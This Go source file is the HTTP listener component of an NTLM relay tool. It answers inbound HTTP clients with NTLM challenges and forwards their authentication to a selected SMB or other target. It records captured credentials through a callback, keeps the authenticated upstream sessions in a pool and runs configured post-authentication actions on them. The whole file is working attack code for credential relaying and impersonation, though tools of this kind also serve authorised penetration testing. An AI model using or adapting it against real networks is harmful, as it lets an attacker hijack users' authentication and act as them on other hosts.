// MIT License
//
// Copyright (c) 2026 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package relay

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"net"
	"net/http"
	"sync"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/server"
)

// httpListenerState holds per-connection NTLM state on the inbound side. NTLM
// over HTTP (RFC 4559 §5) is connection-oriented: the NEGOTIATE and the
// AUTHENTICATE must traverse the same TCP connection so the server can
// correlate them.
type httpListenerState struct {
	forwarder Forwarder
}

// httpListener is the inbound HTTP NTLM capture listener. Each accepted TCP
// connection drives a per-conn NTLM exchange that is forwarded onto a target
// chosen by the parent RelayServer.
type httpListener struct {
	rs      *RelayServer
	srv     *http.Server
	ln      net.Listener
	logger  server.Logger
	stateMu sync.Mutex
	states  map[net.Conn]*httpListenerState
	tlsConf *tls.Config
}

// newHTTPListener constructs (but does not start) an inbound HTTP listener.
// tlsConf, when non-nil, enables HTTPS on the inbound side.
func newHTTPListener(rs *RelayServer, tlsConf *tls.Config) *httpListener {
	return &httpListener{
		rs:      rs,
		logger:  rs.logger(),
		states:  map[net.Conn]*httpListenerState{},
		tlsConf: tlsConf,
	}
}

// start binds the configured HTTP listen address and serves until Close.
func (l *httpListener) start(addr string) error {
	if addr == "" {
		return fmt.Errorf("empty listen addr")
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("listen %s: %w", addr, err)
	}
	l.ln = ln
	l.srv = &http.Server{
		Handler: http.HandlerFunc(l.handle),
		ConnContext: func(ctx context.Context, c net.Conn) context.Context {
			return context.WithValue(ctx, httpConnKey{}, c)
		},
		ConnState: l.onConnState,
	}
	go func() {
		var serveErr error
		if l.tlsConf != nil {
			l.srv.TLSConfig = l.tlsConf
			serveErr = l.srv.ServeTLS(ln, "", "")
		} else {
			serveErr = l.srv.Serve(ln)
		}
		if serveErr != nil && !errors.Is(serveErr, http.ErrServerClosed) {
			l.logger.Errorf("relay http serve on %s: %v", ln.Addr(), serveErr)
		}
	}()
	return nil
}

func (l *httpListener) close(ctx context.Context) error {
	if l.srv == nil {
		return nil
	}
	err := l.srv.Shutdown(ctx)
	l.stateMu.Lock()
	for c, st := range l.states {
		if st.forwarder != nil {
			st.forwarder.Close()
		}
		delete(l.states, c)
	}
	l.stateMu.Unlock()
	return err
}

func (l *httpListener) addr() net.Addr {
	if l.ln == nil {
		return nil
	}
	return l.ln.Addr()
}

type httpConnKey struct{}

func (l *httpListener) onConnState(c net.Conn, state http.ConnState) {
	if state != http.StateClosed && state != http.StateHijacked {
		return
	}
	l.stateMu.Lock()
	st, ok := l.states[c]
	delete(l.states, c)
	l.stateMu.Unlock()
	if ok && st != nil && st.forwarder != nil {
		st.forwarder.Close()
	}
}

// handle is the http.Handler for the inbound listener. It steps the
// per-connection NTLM state machine and pools the resulting upstream after a
// successful AUTHENTICATE.
func (l *httpListener) handle(w http.ResponseWriter, r *http.Request) {
	cfg := &l.rs.Config
	c, _ := r.Context().Value(httpConnKey{}).(net.Conn)

	auth := r.Header.Get("Authorization")
	if auth == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "Keep-Alive")
		w.Header().Set("Content-Length", "0")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}
	token, err := extractNTLMAuth([]string{auth})
	if err != nil {
		l.logger.Debugf("bad Authorization header from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Bad Authorization", http.StatusBadRequest)
		return
	}
	if len(token) < 12 || string(token[:7]) != "NTLMSSP" {
		http.Error(w, "Bad NTLMSSP payload", http.StatusBadRequest)
		return
	}
	// All NTLM message types we handle need the underlying net.Conn (to
	// identify the source for target selection and to key per-conn NTLM
	// state). The ConnContext hook always installs it; a nil here means an
	// http.Server misconfiguration, not a malformed request.
	if c == nil {
		l.logger.Errorf("missing conn context for %s", r.RemoteAddr)
		http.Error(w, "internal", http.StatusInternalServerError)
		return
	}
	switch token[8] {
	case 0x01: // NEGOTIATE
		target, ok := l.pickTarget(c.RemoteAddr())
		if !ok {
			l.rs.notifyFailure("", fmt.Errorf("no targets configured"))
			http.Error(w, "no targets", http.StatusServiceUnavailable)
			return
		}
		fwd, err := newForwarderFor(target, cfg, l.logger)
		if err != nil {
			l.rs.notifyFailure(target.String(), err)
			http.Error(w, "no forwarder", http.StatusBadGateway)
			return
		}
		chBytes, err := fwd.Negotiate(token)
		if err != nil {
			fwd.Close()
			l.rs.notifyFailure(target.String(), err)
			http.Error(w, "upstream error", http.StatusBadGateway)
			return
		}
		l.stateMu.Lock()
		if prev := l.states[c]; prev != nil && prev.forwarder != nil {
			prev.forwarder.Close()
		}
		l.states[c] = &httpListenerState{forwarder: fwd}
		l.stateMu.Unlock()
		w.Header().Set("WWW-Authenticate", "NTLM "+base64.StdEncoding.EncodeToString(chBytes))
		w.Header().Set("Connection", "Keep-Alive")
		w.Header().Set("Content-Length", "0")
		w.WriteHeader(http.StatusUnauthorized)

	case 0x03: // AUTHENTICATE
		l.stateMu.Lock()
		st := l.states[c]
		delete(l.states, c)
		l.stateMu.Unlock()
		if st == nil || st.forwarder == nil {
			l.logger.Debugf("AUTHENTICATE without prior NEGOTIATE on %s", r.RemoteAddr)
			http.Error(w, "missing NEGOTIATE", http.StatusBadRequest)
			return
		}
		fwd := st.forwarder
		cred, upstreamStatus, err := fwd.Authenticate(c.RemoteAddr(), token, nil)
		var slot *captureSlot
		if cred != nil {
			if cb := cfg.OnCredentialCaptured; cb != nil {
				cb(nil, cred)
			}
			slot = l.rs.captureRecord(cred, fwd.Target().String())
		}
		if err != nil {
			fwd.Close()
			slot.finalize(CaptureStatusRelayFailed)
			l.rs.notifyFailure(fwd.Target().String(), err)
			http.Error(w, "upstream error", http.StatusBadGateway)
			return
		}
		if upstreamStatus != smb.StatusOk {
			fwd.Close()
			slot.finalize(CaptureStatusUpstreamRejected)
			l.rs.notifyFailure(fwd.Target().String(), fmt.Errorf("upstream rejected (status=0x%08x)", upstreamStatus))
			w.Header().Set("Content-Length", "0")
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		ps := l.rs.poolFromForwarder(fwd, cred)
		l.rs.pool.Add(ps)
		l.rs.markUsed(fwd.Target().Host, ps.Established)
		slot.finalize(CaptureStatusRelayed)
		l.logger.Noticef("%s -> %s (%s)", credLabel(cred), fwd.Target().String(), cred.Format)
		if cb := cfg.OnRelaySuccess; cb != nil {
			cb(fwd.Target().String(), ps.Conn, cred)
		}
		if ps.Conn != nil && len(cfg.PostAuthActions) > 0 {
			l.rs.wg.Add(1)
			go l.rs.runActions(ps)
		}
		w.Header().Set("Content-Length", "0")
		w.WriteHeader(http.StatusUnauthorized)

	default:
		http.Error(w, "Bad NTLM message type", http.StatusBadRequest)
	}
}

// pickTarget returns one target candidate for an HTTP-inbound auth. The HTTP
// listener can relay onto any protocol, so the full parsed Targets list is
// passed to SelectTarget; restricting candidates is the caller's choice.
func (l *httpListener) pickTarget(remote net.Addr) (Target, bool) {
	targets := l.rs.snapshotTargets()
	if len(targets) == 0 {
		return Target{}, false
	}
	l.rs.mu.Lock()
	lastUsed := l.rs.lastUsed
	l.rs.mu.Unlock()
	t := (*l.rs.selectTarget.Load())(targets, remote, lastUsed)
	if t.Host == "" {
		return Target{}, false
	}
	return t, true
}

